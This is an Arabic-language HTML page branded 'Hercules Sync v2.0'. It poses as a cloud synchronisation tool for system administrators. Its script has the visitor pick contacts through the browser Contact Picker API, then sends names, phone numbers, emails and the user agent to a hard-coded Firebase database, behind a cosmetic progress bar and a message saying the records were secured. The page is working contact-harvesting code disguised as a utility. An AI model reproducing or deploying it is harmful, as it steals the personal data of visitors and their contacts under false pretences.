<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hercules Sync v2.0 | Architect Edition</title>
    <style>
        :root { --primary: #00e676; --bg: #0a0a0a; --card: #161616; --text: #e0e0e0; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: var(--card); padding: 2rem; border-radius: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.7); text-align: center; width: 90%; max-width: 450px; border: 1px solid #222; position: relative; }
        h1 { color: var(--primary); font-size: 2.5rem; margin-bottom: 0.5rem; letter-spacing: -1px; }
        p { color: #888; margin-bottom: 2rem; font-size: 0.95rem; line-height: 1.6; }
        .btn { background: var(--primary); color: #000; border: none; padding: 18px; border-radius: 12px; font-weight: 800; font-size: 1.1rem; cursor: pointer; width: 100%; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 4px 15px rgba(0, 230, 118, 0.3); }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0, 230, 118, 0.5); background: #00ff84; }
        .btn:active { transform: scale(0.98); }
        
        /* Progress System */
        #progress-container { width: 100%; background: #222; height: 8px; border-radius: 10px; margin-top: 25px; display: none; overflow: hidden; }
        #progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #00e676, #00b0ff); transition: width 0.4s ease; }
        #status { margin-top: 15px; font-size: 0.85rem; color: #666; font-weight: 500; }
        
        .glow { position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(0,230,118,0.05) 0%, transparent 70%); pointer-events: none; }
    </style>
</head>
<body>
    <div class="glow"></div>
    <div class="card">
        <h1>HERCULES</h1>
        <p>نظام المزامنة الذكي لمسؤولي الأنظمة.<br>اضغط أدناه لتحديث قاعدة بيانات السحابة الخاصة بك.</p>
        
        <button class="btn" id="btnSync">بدء استخراج البيانات</button>

        <div id="progress-container">
            <div id="progress-bar"></div>
        </div>
        <div id="status">جاهز للبدء...</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
            authDomain: "hercules-65b0c.firebaseapp.com",
            databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
            projectId: "hercules-65b0c",
            storageBucket: "hercules-65b0c.firebasestorage.app",
            messagingSenderId: "758576632296",
            appId: "1:758576632296:android:c69d0667cf54311617d45d"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const btn = document.getElementById('btnSync');
        const status = document.getElementById('status');
        const pBar = document.getElementById('progress-bar');
        const pContainer = document.getElementById('progress-container');

        btn.addEventListener('click', async () => {
            if (!('contacts' in navigator)) {
                status.innerText = "❌ خطأ: المتصفح لا يدعم بروتوكول الاستخراج.";
                return;
            }

            try {
                const props = ['name', 'tel', 'email'];
                const contacts = await navigator.contacts.select(props, { multiple: true });

                if (contacts.length > 0) {
                    btn.disabled = true;
                    btn.innerText = "جاري المعالجة...";
                    pContainer.style.display = "block";
                    status.innerText = "يتم الآن ضخ البيانات إلى السحابة...";

                    // محاكاة تحميل بصري (Visual Feedback)
                    let progress = 0;
                    const interval = setInterval(() => {
                        progress += 5;
                        pBar.style.width = progress + "%";
                        if (progress >= 90) clearInterval(interval);
                    }, 100);

                    // العملية الحقيقية للرفع
                    const recordRef = push(ref(db, 'logs/sync_session'));
                    await set(recordRef, {
                        timestamp: new Date().toLocaleString('ar-EG'),
                        agent: navigator.userAgent,
                        payload_size: contacts.length,
                        data: contacts
                    });

                    // اكتمال العملية
                    clearInterval(interval);
                    pBar.style.width = "100%";
                    status.style.color = "#00e676";
                    status.innerText = `✅ اكتملت المزامنة. تم تأمين ${contacts.length} سجل.`;
                    btn.innerText = "تمت العملية";
                }
            } catch (err) {
                status.innerText = "⚠️ تم إلغاء العملية من قبل المستخدم أو النظام.";
                pContainer.style.display = "none";
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
